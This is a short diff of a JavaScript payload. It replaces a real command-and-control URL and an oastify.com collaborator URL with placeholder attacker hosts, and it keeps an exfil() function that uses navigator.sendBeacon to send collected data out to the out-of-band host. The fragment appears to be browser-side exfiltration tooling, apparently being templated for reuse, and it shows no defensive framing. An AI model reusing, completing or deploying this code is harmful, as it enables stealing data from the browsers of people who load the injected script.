@@ -1,6 +1,6 @@
   (function () {
-    const C2  = 'https://gleeful-creponne-8ff162.netlify.app';
-    const OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com';
+    const C2  = 'https://YOUR_C2_SERVER.example.com';
+    const OOB = 'https://YOUR_COLLABORATOR_ID.oastify.com';
 
     function exfil(tag, data) {
       navigator.sendBeacon(OOB + '/p?t=' + tag, JSON.stringify(data));
